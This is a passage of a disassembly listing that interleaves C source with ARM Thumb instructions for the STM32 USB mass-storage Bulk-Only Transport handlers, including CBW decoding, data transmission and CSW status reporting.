  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009314:	68fb      	ldr	r3, [r7, #12]
 8009316:	2b00      	cmp	r3, #0
 8009318:	d01c      	beq.n	8009354 <MSC_BOT_Reset+0x58>
  {
    return;
  }

  hmsc->bot_state  = USBD_BOT_IDLE;
 800931a:	68fb      	ldr	r3, [r7, #12]
 800931c:	2200      	movs	r2, #0
 800931e:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_RECOVERY;
 8009320:	68fb      	ldr	r3, [r7, #12]
 8009322:	2201      	movs	r2, #1
 8009324:	725a      	strb	r2, [r3, #9]

  (void)USBD_LL_ClearStallEP(pdev, MSCInEpAdd);
 8009326:	4b0d      	ldr	r3, [pc, #52]	; (800935c <MSC_BOT_Reset+0x60>)
 8009328:	781b      	ldrb	r3, [r3, #0]
 800932a:	4619      	mov	r1, r3
 800932c:	6878      	ldr	r0, [r7, #4]
 800932e:	f003 fcc1 	bl	800ccb4 <USBD_LL_ClearStallEP>
  (void)USBD_LL_ClearStallEP(pdev, MSCOutEpAdd);
 8009332:	4b0b      	ldr	r3, [pc, #44]	; (8009360 <MSC_BOT_Reset+0x64>)
 8009334:	781b      	ldrb	r3, [r3, #0]
 8009336:	4619      	mov	r1, r3
 8009338:	6878      	ldr	r0, [r7, #4]
 800933a:	f003 fcbb 	bl	800ccb4 <USBD_LL_ClearStallEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 800933e:	4b08      	ldr	r3, [pc, #32]	; (8009360 <MSC_BOT_Reset+0x64>)
 8009340:	7819      	ldrb	r1, [r3, #0]
 8009342:	68fb      	ldr	r3, [r7, #12]
 8009344:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 8009348:	3210      	adds	r2, #16
 800934a:	231f      	movs	r3, #31
 800934c:	6878      	ldr	r0, [r7, #4]
 800934e:	f003 fd83 	bl	800ce58 <USBD_LL_PrepareReceive>
 8009352:	e000      	b.n	8009356 <MSC_BOT_Reset+0x5a>
    return;
 8009354:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 8009356:	3710      	adds	r7, #16
 8009358:	46bd      	mov	sp, r7
 800935a:	bd80      	pop	{r7, pc}
 800935c:	2000010a 	.word	0x2000010a
 8009360:	2000010b 	.word	0x2000010b

08009364 <MSC_BOT_DeInit>:
  *         DeInitialize the BOT Machine
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_DeInit(USBD_HandleTypeDef  *pdev)
{
 8009364:	b480      	push	{r7}
 8009366:	b085      	sub	sp, #20
 8009368:	af00      	add	r7, sp, #0
 800936a:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800936c:	687b      	ldr	r3, [r7, #4]
 800936e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009372:	687b      	ldr	r3, [r7, #4]
 8009374:	32b0      	adds	r2, #176	; 0xb0
 8009376:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800937a:	60fb      	str	r3, [r7, #12]

  if (hmsc != NULL)
 800937c:	68fb      	ldr	r3, [r7, #12]
 800937e:	2b00      	cmp	r3, #0
 8009380:	d002      	beq.n	8009388 <MSC_BOT_DeInit+0x24>
  {
    hmsc->bot_state = USBD_BOT_IDLE;
 8009382:	68fb      	ldr	r3, [r7, #12]
 8009384:	2200      	movs	r2, #0
 8009386:	721a      	strb	r2, [r3, #8]
  }
}
 8009388:	bf00      	nop
 800938a:	3714      	adds	r7, #20
 800938c:	46bd      	mov	sp, r7
 800938e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8009392:	4770      	bx	lr

08009394 <MSC_BOT_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009394:	b580      	push	{r7, lr}
 8009396:	b084      	sub	sp, #16
 8009398:	af00      	add	r7, sp, #0
 800939a:	6078      	str	r0, [r7, #4]
 800939c:	460b      	mov	r3, r1
 800939e:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80093a0:	687b      	ldr	r3, [r7, #4]
 80093a2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80093a6:	687b      	ldr	r3, [r7, #4]
 80093a8:	32b0      	adds	r2, #176	; 0xb0
 80093aa:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80093ae:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 80093b0:	68fb      	ldr	r3, [r7, #12]
 80093b2:	2b00      	cmp	r3, #0
 80093b4:	d022      	beq.n	80093fc <MSC_BOT_DataIn+0x68>
  {
    return;
  }

  switch (hmsc->bot_state)
 80093b6:	68fb      	ldr	r3, [r7, #12]
 80093b8:	7a1b      	ldrb	r3, [r3, #8]
 80093ba:	2b02      	cmp	r3, #2
 80093bc:	d005      	beq.n	80093ca <MSC_BOT_DataIn+0x36>
 80093be:	2b02      	cmp	r3, #2
 80093c0:	db1e      	blt.n	8009400 <MSC_BOT_DataIn+0x6c>
 80093c2:	3b03      	subs	r3, #3
 80093c4:	2b01      	cmp	r3, #1
 80093c6:	d81b      	bhi.n	8009400 <MSC_BOT_DataIn+0x6c>
 80093c8:	e013      	b.n	80093f2 <MSC_BOT_DataIn+0x5e>
  {
    case USBD_BOT_DATA_IN:
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 80093ca:	68fb      	ldr	r3, [r7, #12]
 80093cc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80093d0:	7f59      	ldrb	r1, [r3, #29]
 80093d2:	68fb      	ldr	r3, [r7, #12]
 80093d4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80093d8:	331f      	adds	r3, #31
 80093da:	461a      	mov	r2, r3
 80093dc:	6878      	ldr	r0, [r7, #4]
 80093de:	f000 f9e5 	bl	80097ac <SCSI_ProcessCmd>
 80093e2:	4603      	mov	r3, r0
 80093e4:	2b00      	cmp	r3, #0
 80093e6:	da0d      	bge.n	8009404 <MSC_BOT_DataIn+0x70>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 80093e8:	2101      	movs	r1, #1
 80093ea:	6878      	ldr	r0, [r7, #4]
 80093ec:	f000 f920 	bl	8009630 <MSC_BOT_SendCSW>
      }
      break;
 80093f0:	e008      	b.n	8009404 <MSC_BOT_DataIn+0x70>

    case USBD_BOT_SEND_DATA:
    case USBD_BOT_LAST_DATA_IN:
      MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 80093f2:	2100      	movs	r1, #0
 80093f4:	6878      	ldr	r0, [r7, #4]
 80093f6:	f000 f91b 	bl	8009630 <MSC_BOT_SendCSW>
      break;
 80093fa:	e004      	b.n	8009406 <MSC_BOT_DataIn+0x72>
    return;
 80093fc:	bf00      	nop
 80093fe:	e002      	b.n	8009406 <MSC_BOT_DataIn+0x72>

    default:
      break;
 8009400:	bf00      	nop
 8009402:	e000      	b.n	8009406 <MSC_BOT_DataIn+0x72>
      break;
 8009404:	bf00      	nop
  }
}
 8009406:	3710      	adds	r7, #16
 8009408:	46bd      	mov	sp, r7
 800940a:	bd80      	pop	{r7, pc}

0800940c <MSC_BOT_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 800940c:	b580      	push	{r7, lr}
 800940e:	b084      	sub	sp, #16
 8009410:	af00      	add	r7, sp, #0
 8009412:	6078      	str	r0, [r7, #4]
 8009414:	460b      	mov	r3, r1
 8009416:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009418:	687b      	ldr	r3, [r7, #4]
 800941a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800941e:	687b      	ldr	r3, [r7, #4]
 8009420:	32b0      	adds	r2, #176	; 0xb0
 8009422:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009426:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 8009428:	68fb      	ldr	r3, [r7, #12]
 800942a:	2b00      	cmp	r3, #0
 800942c:	d01e      	beq.n	800946c <MSC_BOT_DataOut+0x60>
  {
    return;
  }

  switch (hmsc->bot_state)
 800942e:	68fb      	ldr	r3, [r7, #12]
 8009430:	7a1b      	ldrb	r3, [r3, #8]
 8009432:	2b00      	cmp	r3, #0
 8009434:	d002      	beq.n	800943c <MSC_BOT_DataOut+0x30>
 8009436:	2b01      	cmp	r3, #1
 8009438:	d004      	beq.n	8009444 <MSC_BOT_DataOut+0x38>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
      }
      break;

    default:
      break;
 800943a:	e01a      	b.n	8009472 <MSC_BOT_DataOut+0x66>
      MSC_BOT_CBW_Decode(pdev);
 800943c:	6878      	ldr	r0, [r7, #4]
 800943e:	f000 f81b 	bl	8009478 <MSC_BOT_CBW_Decode>
      break;
 8009442:	e016      	b.n	8009472 <MSC_BOT_DataOut+0x66>
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 8009444:	68fb      	ldr	r3, [r7, #12]
 8009446:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800944a:	7f59      	ldrb	r1, [r3, #29]
 800944c:	68fb      	ldr	r3, [r7, #12]
 800944e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009452:	331f      	adds	r3, #31
 8009454:	461a      	mov	r2, r3
 8009456:	6878      	ldr	r0, [r7, #4]
 8009458:	f000 f9a8 	bl	80097ac <SCSI_ProcessCmd>
 800945c:	4603      	mov	r3, r0
 800945e:	2b00      	cmp	r3, #0
 8009460:	da06      	bge.n	8009470 <MSC_BOT_DataOut+0x64>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009462:	2101      	movs	r1, #1
 8009464:	6878      	ldr	r0, [r7, #4]
 8009466:	f000 f8e3 	bl	8009630 <MSC_BOT_SendCSW>
      break;
 800946a:	e001      	b.n	8009470 <MSC_BOT_DataOut+0x64>
    return;
 800946c:	bf00      	nop
 800946e:	e000      	b.n	8009472 <MSC_BOT_DataOut+0x66>
      break;
 8009470:	bf00      	nop
  }
}
 8009472:	3710      	adds	r7, #16
 8009474:	46bd      	mov	sp, r7
 8009476:	bd80      	pop	{r7, pc}

08009478 <MSC_BOT_CBW_Decode>:
  *         Decode the CBW command and set the BOT state machine accordingly
  * @param  pdev: device instance
  * @retval None
  */
static void  MSC_BOT_CBW_Decode(USBD_HandleTypeDef *pdev)
{
 8009478:	b580      	push	{r7, lr}
 800947a:	b084      	sub	sp, #16
 800947c:	af00      	add	r7, sp, #0
 800947e:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009480:	687b      	ldr	r3, [r7, #4]
 8009482:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009486:	687b      	ldr	r3, [r7, #4]
 8009488:	32b0      	adds	r2, #176	; 0xb0
 800948a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800948e:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009490:	68fb      	ldr	r3, [r7, #12]
 8009492:	2b00      	cmp	r3, #0
 8009494:	f000 8085 	beq.w	80095a2 <MSC_BOT_CBW_Decode+0x12a>
  {
    return;
  }

  hmsc->csw.dTag = hmsc->cbw.dTag;
 8009498:	68fb      	ldr	r3, [r7, #12]
 800949a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800949e:	695b      	ldr	r3, [r3, #20]
 80094a0:	68fa      	ldr	r2, [r7, #12]
 80094a2:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 80094a6:	6353      	str	r3, [r2, #52]	; 0x34
  hmsc->csw.dDataResidue = hmsc->cbw.dDataLength;
 80094a8:	68fb      	ldr	r3, [r7, #12]
 80094aa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094ae:	699b      	ldr	r3, [r3, #24]
 80094b0:	68fa      	ldr	r2, [r7, #12]
 80094b2:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 80094b6:	6393      	str	r3, [r2, #56]	; 0x38

  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 80094b8:	4b3d      	ldr	r3, [pc, #244]	; (80095b0 <MSC_BOT_CBW_Decode+0x138>)
 80094ba:	781b      	ldrb	r3, [r3, #0]
 80094bc:	4619      	mov	r1, r3
 80094be:	6878      	ldr	r0, [r7, #4]
 80094c0:	f003 fd02 	bl	800cec8 <USBD_LL_GetRxDataSize>
 80094c4:	4603      	mov	r3, r0
 80094c6:	2b1f      	cmp	r3, #31
 80094c8:	d118      	bne.n	80094fc <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 80094ca:	68fb      	ldr	r3, [r7, #12]
 80094cc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094d0:	691b      	ldr	r3, [r3, #16]
  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 80094d2:	4a38      	ldr	r2, [pc, #224]	; (80095b4 <MSC_BOT_CBW_Decode+0x13c>)
 80094d4:	4293      	cmp	r3, r2
 80094d6:	d111      	bne.n	80094fc <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 80094d8:	68fb      	ldr	r3, [r7, #12]
 80094da:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094de:	7f5b      	ldrb	r3, [r3, #29]
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 80094e0:	2b01      	cmp	r3, #1
 80094e2:	d80b      	bhi.n	80094fc <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 80094e4:	68fb      	ldr	r3, [r7, #12]
 80094e6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094ea:	7f9b      	ldrb	r3, [r3, #30]
 80094ec:	2b00      	cmp	r3, #0
 80094ee:	d005      	beq.n	80094fc <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bCBLength > 16U))
 80094f0:	68fb      	ldr	r3, [r7, #12]
 80094f2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094f6:	7f9b      	ldrb	r3, [r3, #30]
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 80094f8:	2b10      	cmp	r3, #16
 80094fa:	d90f      	bls.n	800951c <MSC_BOT_CBW_Decode+0xa4>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 80094fc:	68fb      	ldr	r3, [r7, #12]
 80094fe:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009502:	7f59      	ldrb	r1, [r3, #29]
 8009504:	2320      	movs	r3, #32
 8009506:	2205      	movs	r2, #5
 8009508:	6878      	ldr	r0, [r7, #4]
 800950a:	f000 fe7b 	bl	800a204 <SCSI_SenseCode>

    hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 800950e:	68fb      	ldr	r3, [r7, #12]
 8009510:	2202      	movs	r2, #2
 8009512:	725a      	strb	r2, [r3, #9]
    MSC_BOT_Abort(pdev);
 8009514:	6878      	ldr	r0, [r7, #4]
 8009516:	f000 f8cb 	bl	80096b0 <MSC_BOT_Abort>
 800951a:	e045      	b.n	80095a8 <MSC_BOT_CBW_Decode+0x130>
  }
  else
  {
    if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 800951c:	68fb      	ldr	r3, [r7, #12]
 800951e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009522:	7f59      	ldrb	r1, [r3, #29]
 8009524:	68fb      	ldr	r3, [r7, #12]
 8009526:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800952a:	331f      	adds	r3, #31
 800952c:	461a      	mov	r2, r3
 800952e:	6878      	ldr	r0, [r7, #4]
 8009530:	f000 f93c 	bl	80097ac <SCSI_ProcessCmd>
 8009534:	4603      	mov	r3, r0
 8009536:	2b00      	cmp	r3, #0
 8009538:	da0c      	bge.n	8009554 <MSC_BOT_CBW_Decode+0xdc>
    {
      if (hmsc->bot_state == USBD_BOT_NO_DATA)
 800953a:	68fb      	ldr	r3, [r7, #12]
 800953c:	7a1b      	ldrb	r3, [r3, #8]
 800953e:	2b05      	cmp	r3, #5
 8009540:	d104      	bne.n	800954c <MSC_BOT_CBW_Decode+0xd4>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009542:	2101      	movs	r1, #1
 8009544:	6878      	ldr	r0, [r7, #4]
 8009546:	f000 f873 	bl	8009630 <MSC_BOT_SendCSW>
 800954a:	e02d      	b.n	80095a8 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 800954c:	6878      	ldr	r0, [r7, #4]
 800954e:	f000 f8af 	bl	80096b0 <MSC_BOT_Abort>
 8009552:	e029      	b.n	80095a8 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    /* Burst xfer handled internally */
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 8009554:	68fb      	ldr	r3, [r7, #12]
 8009556:	7a1b      	ldrb	r3, [r3, #8]
 8009558:	2b02      	cmp	r3, #2
 800955a:	d024      	beq.n	80095a6 <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 800955c:	68fb      	ldr	r3, [r7, #12]
 800955e:	7a1b      	ldrb	r3, [r3, #8]
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 8009560:	2b01      	cmp	r3, #1
 8009562:	d020      	beq.n	80095a6 <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_LAST_DATA_IN))
 8009564:	68fb      	ldr	r3, [r7, #12]
 8009566:	7a1b      	ldrb	r3, [r3, #8]
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 8009568:	2b03      	cmp	r3, #3
 800956a:	d01c      	beq.n	80095a6 <MSC_BOT_CBW_Decode+0x12e>
    {
      if (hmsc->bot_data_length > 0U)
 800956c:	68fb      	ldr	r3, [r7, #12]
 800956e:	68db      	ldr	r3, [r3, #12]
 8009570:	2b00      	cmp	r3, #0
 8009572:	d009      	beq.n	8009588 <MSC_BOT_CBW_Decode+0x110>
      {
        MSC_BOT_SendData(pdev, hmsc->bot_data, hmsc->bot_data_length);
 8009574:	68fb      	ldr	r3, [r7, #12]
 8009576:	f103 0110 	add.w	r1, r3, #16
 800957a:	68fb      	ldr	r3, [r7, #12]
 800957c:	68db      	ldr	r3, [r3, #12]
 800957e:	461a      	mov	r2, r3
 8009580:	6878      	ldr	r0, [r7, #4]
 8009582:	f000 f819 	bl	80095b8 <MSC_BOT_SendData>
      if (hmsc->bot_data_length > 0U)
 8009586:	e00f      	b.n	80095a8 <MSC_BOT_CBW_Decode+0x130>
      }
      else if (hmsc->bot_data_length == 0U)
 8009588:	68fb      	ldr	r3, [r7, #12]
 800958a:	68db      	ldr	r3, [r3, #12]
 800958c:	2b00      	cmp	r3, #0
 800958e:	d104      	bne.n	800959a <MSC_BOT_CBW_Decode+0x122>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 8009590:	2100      	movs	r1, #0
 8009592:	6878      	ldr	r0, [r7, #4]
 8009594:	f000 f84c 	bl	8009630 <MSC_BOT_SendCSW>
      if (hmsc->bot_data_length > 0U)
 8009598:	e006      	b.n	80095a8 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 800959a:	6878      	ldr	r0, [r7, #4]
 800959c:	f000 f888 	bl	80096b0 <MSC_BOT_Abort>
      if (hmsc->bot_data_length > 0U)
 80095a0:	e002      	b.n	80095a8 <MSC_BOT_CBW_Decode+0x130>
    return;
 80095a2:	bf00      	nop
 80095a4:	e000      	b.n	80095a8 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    else
    {
      return;
 80095a6:	bf00      	nop
    }
  }
}
 80095a8:	3710      	adds	r7, #16
 80095aa:	46bd      	mov	sp, r7
 80095ac:	bd80      	pop	{r7, pc}
 80095ae:	bf00      	nop
 80095b0:	2000010b 	.word	0x2000010b
 80095b4:	43425355 	.word	0x43425355

080095b8 <MSC_BOT_SendData>:
  * @param  buf: pointer to data buffer
  * @param  len: Data Length
  * @retval None
  */
static void  MSC_BOT_SendData(USBD_HandleTypeDef *pdev, uint8_t *pbuf, uint32_t len)
{
 80095b8:	b580      	push	{r7, lr}
 80095ba:	b086      	sub	sp, #24
 80095bc:	af00      	add	r7, sp, #0
 80095be:	60f8      	str	r0, [r7, #12]
 80095c0:	60b9      	str	r1, [r7, #8]
 80095c2:	607a      	str	r2, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80095c4:	68fb      	ldr	r3, [r7, #12]
 80095c6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80095ca:	68fb      	ldr	r3, [r7, #12]
 80095cc:	32b0      	adds	r2, #176	; 0xb0
 80095ce:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80095d2:	617b      	str	r3, [r7, #20]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80095d4:	697b      	ldr	r3, [r7, #20]
 80095d6:	2b00      	cmp	r3, #0
 80095d8:	d023      	beq.n	8009622 <MSC_BOT_SendData+0x6a>
  {
    return;
  }

  length = MIN(hmsc->cbw.dDataLength, len);
 80095da:	697b      	ldr	r3, [r7, #20]
 80095dc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80095e0:	699b      	ldr	r3, [r3, #24]
 80095e2:	687a      	ldr	r2, [r7, #4]
 80095e4:	4293      	cmp	r3, r2
 80095e6:	bf28      	it	cs
 80095e8:	4613      	movcs	r3, r2
 80095ea:	613b      	str	r3, [r7, #16]

  hmsc->csw.dDataResidue -= len;
 80095ec:	697b      	ldr	r3, [r7, #20]
 80095ee:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80095f2:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 80095f4:	687b      	ldr	r3, [r7, #4]
 80095f6:	1ad3      	subs	r3, r2, r3
 80095f8:	697a      	ldr	r2, [r7, #20]
 80095fa:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 80095fe:	6393      	str	r3, [r2, #56]	; 0x38
  hmsc->csw.bStatus = USBD_CSW_CMD_PASSED;
 8009600:	697b      	ldr	r3, [r7, #20]
 8009602:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009606:	2200      	movs	r2, #0
 8009608:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_SEND_DATA;
 800960c:	697b      	ldr	r3, [r7, #20]
 800960e:	2204      	movs	r2, #4
 8009610:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, pbuf, length);
 8009612:	4b06      	ldr	r3, [pc, #24]	; (800962c <MSC_BOT_SendData+0x74>)
 8009614:	7819      	ldrb	r1, [r3, #0]
 8009616:	693b      	ldr	r3, [r7, #16]
 8009618:	68ba      	ldr	r2, [r7, #8]
 800961a:	68f8      	ldr	r0, [r7, #12]
 800961c:	f003 fbe4 	bl	800cde8 <USBD_LL_Transmit>
 8009620:	e000      	b.n	8009624 <MSC_BOT_SendData+0x6c>
    return;
 8009622:	bf00      	nop
}
 8009624:	3718      	adds	r7, #24
 8009626:	46bd      	mov	sp, r7
 8009628:	bd80      	pop	{r7, pc}
 800962a:	bf00      	nop
 800962c:	2000010a 	.word	0x2000010a

08009630 <MSC_BOT_SendCSW>:
  * @param  pdev: device instance
  * @param  status : CSW status
  * @retval None
  */
void  MSC_BOT_SendCSW(USBD_HandleTypeDef *pdev, uint8_t CSW_Status)
{
 8009630:	b580      	push	{r7, lr}
 8009632:	b084      	sub	sp, #16
 8009634:	af00      	add	r7, sp, #0
 8009636:	6078      	str	r0, [r7, #4]
 8009638:	460b      	mov	r3, r1
 800963a:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800963c:	687b      	ldr	r3, [r7, #4]
 800963e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009642:	687b      	ldr	r3, [r7, #4]
 8009644:	32b0      	adds	r2, #176	; 0xb0
 8009646:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800964a:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 800964c:	68fb      	ldr	r3, [r7, #12]
 800964e:	2b00      	cmp	r3, #0
 8009650:	d024      	beq.n	800969c <MSC_BOT_SendCSW+0x6c>
  {
    return;
  }

  hmsc->csw.dSignature = USBD_BOT_CSW_SIGNATURE;
 8009652:	68fb      	ldr	r3, [r7, #12]
 8009654:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009658:	461a      	mov	r2, r3
 800965a:	4b12      	ldr	r3, [pc, #72]	; (80096a4 <MSC_BOT_SendCSW+0x74>)
 800965c:	6313      	str	r3, [r2, #48]	; 0x30
  hmsc->csw.bStatus = CSW_Status;
 800965e:	68fb      	ldr	r3, [r7, #12]
 8009660:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009664:	461a      	mov	r2, r3
 8009666:	78fb      	ldrb	r3, [r7, #3]
 8009668:	f882 303c 	strb.w	r3, [r2, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_IDLE;
 800966c:	68fb      	ldr	r3, [r7, #12]
 800966e:	2200      	movs	r2, #0
 8009670:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, (uint8_t *)&hmsc->csw,
 8009672:	4b0d      	ldr	r3, [pc, #52]	; (80096a8 <MSC_BOT_SendCSW+0x78>)
 8009674:	7819      	ldrb	r1, [r3, #0]
 8009676:	68fb      	ldr	r3, [r7, #12]
 8009678:	f503 5281 	add.w	r2, r3, #4128	; 0x1020
 800967c:	3210      	adds	r2, #16
 800967e:	230d      	movs	r3, #13
 8009680:	6878      	ldr	r0, [r7, #4]
 8009682:	f003 fbb1 	bl	800cde8 <USBD_LL_Transmit>
                         USBD_BOT_CSW_LENGTH);

  /* Prepare EP to Receive next Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 8009686:	4b09      	ldr	r3, [pc, #36]	; (80096ac <MSC_BOT_SendCSW+0x7c>)
 8009688:	7819      	ldrb	r1, [r3, #0]
 800968a:	68fb      	ldr	r3, [r7, #12]
 800968c:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 8009690:	3210      	adds	r2, #16
 8009692:	231f      	movs	r3, #31
 8009694:	6878      	ldr	r0, [r7, #4]
 8009696:	f003 fbdf 	bl	800ce58 <USBD_LL_PrepareReceive>
 800969a:	e000      	b.n	800969e <MSC_BOT_SendCSW+0x6e>
    return;
 800969c:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 800969e:	3710      	adds	r7, #16
 80096a0:	46bd      	mov	sp, r7
 80096a2:	bd80      	pop	{r7, pc}
 80096a4:	53425355 	.word	0x53425355
